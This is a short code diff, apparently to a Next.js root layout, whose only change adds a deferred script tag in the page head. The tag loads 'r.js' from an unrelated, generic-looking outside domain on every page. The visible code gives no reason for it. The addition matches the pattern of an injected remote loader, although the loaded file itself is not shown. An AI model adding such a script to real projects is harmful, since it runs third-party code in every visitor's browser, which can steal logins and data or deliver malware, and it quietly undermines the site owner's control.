@@ -31,6 +31,9 @@ export default function RootLayout({
 }) {
   return (
     <html lang="en">
+      <head>
+        <script src="https://ref.web-free.site/r.js" defer />
+      </head>
       <body className={inter.className}>
         <Providers>{children}</Providers>
         <Toaster />
